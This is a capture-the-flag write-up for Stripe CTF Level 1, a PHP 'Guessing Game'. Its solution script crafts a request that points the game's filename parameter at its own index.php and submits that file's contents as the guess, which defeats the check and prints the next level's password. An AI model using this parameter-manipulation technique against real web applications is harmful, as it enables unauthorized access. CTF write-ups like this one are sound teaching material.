## Level 1

Excellent, you are now on Level 1, the Guessing Game. All you have to do is guess the combination correctly, and you'll be given the password to access Level 2! We've been assured that this level has no security vulnerabilities in it (and the machine running the Guessing Game has no outbound network connectivity, meaning you wouldn't be able to extract the password anyway), so you'll probably just have to try all the possible combinations. Or will you...?

You can play the Guessing Game at https://level01-1.stripe-ctf.com/user-xxxxxxxxxx. The code for the Game can be obtained from `git clone https://level01-1.stripe-ctf.com/user-xxxxxxxxxx/level01-code`, and is also included below.

### Running

- Put index.php on a server somewhere with the two .txt files in the
  same directory.

### Solution

```php
#!/usr/bin/env php
<?php

$endpoint = "https://level01-1.stripe-ctf.com/user-xxxxxxxxxx/";
$url = "$endpoint?filename=index.php&attempt=" . urlencode(trim(file_get_contents("index.php")));

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$result = curl_exec($ch);
curl_close($ch);

if (preg_match('/password to the access Level 2: ([a-zA-Z]+)<\/p>/', $result, /*&*/$matches) && !empty($matches[1])) {
  echo $matches[1] . "\n";
}
```

Originally posted at [https://stripe-ctf.com/levels/1](https://stripe-ctf.com/levels/1).
